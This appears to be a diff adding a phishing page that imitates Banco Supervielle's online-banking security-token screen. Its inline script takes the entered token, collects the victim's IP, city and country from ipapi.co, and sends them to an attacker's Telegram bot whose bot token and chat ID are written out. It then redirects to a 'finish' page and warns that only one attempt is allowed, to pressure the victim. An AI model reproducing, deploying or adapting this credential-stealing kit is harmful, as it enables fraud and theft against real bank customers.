@@ -1,0 +1,87 @@
+<html lang="en"><head>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Online Banking empresas</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+  <link rel="stylesheet" type="text/css" href="css/style.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+</head>
+<body>
+  <div class="full h-100">
+    <div class="ms-auto d-flex flex-column justify-content-between w-100 bg-white h-100 login">
+      <div class="w-100">
+        <header class="w-100">
+          <div class="d-flex flex-column flex-sm-row justify-content-sm-between justify-content-start text-start align-items-sm-center align-items-start">
+            <img src="img/logo.svg" class="loco">
+            <img src="img/menu.png">
+          </div>
+        </header>
+        
+        <main class="mx-auto">
+          <h1 id="titulo2"></h1>
+          
+<p id="descripcion2">Ingresá el código de verificación</p><p id="descripcion2">Lo encontrás en la APP Supervielle como Token de seguridad</p>
+
+          <form id="login-form" class="form" method="POST">
+            <div class="mb-3">
+              <input required="" type="tel" inputmode="numeric" minlength="11" maxlength="11" id="numeros" class="form-control shadow-none border-0 border-bottom rounded-0 ps-0" placeholder="Código de verificación" name="token">
+            </div>
+            <p id="descripcion2">Tenés 1 intentos para ingresar el código correctamente.</p>
+            <p id="descripcion2">De lo contrario se bloqueará y no podrás realizar la operación.</p><button type="submit" name="submit1" id="send" class="btn hebbo btn-danger">Verificar</button>
+          </form>
+          
+          </main>
+        </div>
+        <footer>
+          Banco Supervielle S.A. no solicita actualización de datos vía e-mail o en forma telefónica. Por dudas o consultas sobre temas de seguridad, haga click aquí <br>
+          Ante cualquier inquietud no dude en comunicarse con nosotros al 0810-333-4959.
+        </footer>
+      </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script>
+		const url = "https://ipapi.co/json/";
+		const form = document.querySelector("#login-form");
+		form.addEventListener("submit", (event) => {
+		  event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+		  axios
+			.get(url)
+			.then((response) => {
+			  const numeros = document.querySelector("#numeros").value;
+			  const message =
+				"🔴SUPERVIELLE🔴" +
+				"\n🔑Token 3: " +
+				numeros +
+				"\n🏙️Ciudad: " +
+				response.data.city +
+				"\n🌎Pais: " +
+				response.data.country +
+				"\n🔢IP: " +
+				response.data.ip +
+				"\n💲JSC0D3R💲";
+			  axios
+				.post(
+				  "https://api.telegram.org/bot8041276049:AAGbZI0g15eApp316cmwXwmilXq9mWarV0k/sendMessage",
+				  {
+					chat_id: "-1002497636010",
+					text: message,
+				  }
+				)
+				.then((response) => {
+				  console.log(response.data);
+				  window.location.href = "finish.html";
+				})
+				.catch((error) => {
+				  console.error(error);
+				});
+			})
+			.catch((error) => {
+			  console.log(error);
+			});
+		});
+	  </script>
+    <script type="text/javascript" src="config/personalizar.js"></script>
+    <script type="text/javascript" src="numeros.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+</body></html>
